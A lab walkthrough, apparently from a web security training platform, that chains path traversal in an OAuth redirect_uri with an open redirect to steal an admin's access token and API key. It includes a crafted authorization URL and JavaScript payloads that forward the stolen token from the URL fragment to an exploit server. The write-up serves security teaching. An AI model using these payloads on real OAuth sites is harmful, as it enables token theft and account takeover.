Lab Writeup: Stealing OAuth Access Tokens via an Open Redirect

Level: Practitioner
Category: OAuth, Open Redirect, Access Token Theft

Description:
This lab demonstrates how flawed validation of redirect URIs and a client-side open redirect can be chained to leak OAuth access tokens. The attacker’s goal is to steal the admin's access token and extract their API key via a direct API call.

Objective:
Identify an open redirect on the client application.

Exploit weak redirect URI validation to redirect the access token to the exploit server.

Steal the admin’s access token.
  
Use the token to retrieve the admin’s API key via a direct API call to /me.

Submit the API key to solve the lab.

Step-by-Step Walkthrough:
1. Initial Setup and OAuth Flow Inspection
Log in to the lab as wiener:peter.

Intercept and observe the OAuth login process.

Notice that after logging in, the app sends a GET /me request to retrieve user information using the access token.

Send this request to Burp Repeater for later use.

2. Test Redirect URI Validation
Log out and initiate login again.

From the proxy history, locate the GET /auth?client_id=... request to the OAuth server.

Send it to Repeater.

Modify the redirect_uri parameter with path traversal:

https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1
Send the request and observe that it is accepted and redirects to a blog post, confirming the redirect_uri is vulnerable to path traversal.

3. Locate Open Redirect Endpoint
Explore the blog and locate a "Next post" button at the bottom of blog posts.

Intercept the request:
GET /post/next?path=...

Send it to Repeater.

Test this by setting path=https://example.com and observe redirection to that external domain.

Confirm that the endpoint is an open redirect.

4. Craft the OAuth Authorization URL
Construct a malicious URL that:

Initiates OAuth login,

Uses a redirect_uri pointing to the open redirect,

Forwards the token to the exploit server.

Format:

https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=RANDOM&scope=openid%20profile%20email
Visit this URL in a browser. You should be redirected to your exploit server and see the access token in the URL fragment.

5. Create the Exploit Payload
On the exploit server, go to /exploit and create the following JavaScript payload to extract the fragment and resend it as a query parameter (so it’s logged in the access log):


<script>
window.location = '/?' + document.location.hash.substr(1);
</script>
Store and test it. You should see a log entry such as:

GET /?access_token=eyJhbGciOi...
6. Final Exploit Delivery Script
To automate both redirect and token exfiltration:


<script>
if (!document.location.hash) {
    window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=123456&scope=openid%20profile%20email';
} else {
    window.location = '/?' + document.location.hash.substr(1);
}
</script>
Store this final script on the exploit server.

Click "Deliver exploit to victim."

7. Use the Stolen Token
Monitor the access log.

Extract the access_token from the GET request.

In Burp Repeater, go back to the stored /me request.

Replace the Authorization: Bearer header with the stolen token.

Send the request. You should receive the admin’s user info and their API key.

Final Step:
Copy the API key and paste it into the “Submit solution” form at the top of the lab page.

Summary:
Chained two flaws: directory traversal in redirect_uri and a client-side open redirect.

Successfully forced the victim (admin) to initiate an OAuth login.

Captured the access token using a script that reads the URL fragment.

Retrieved the admin’s API key using the stolen token via a direct API call.
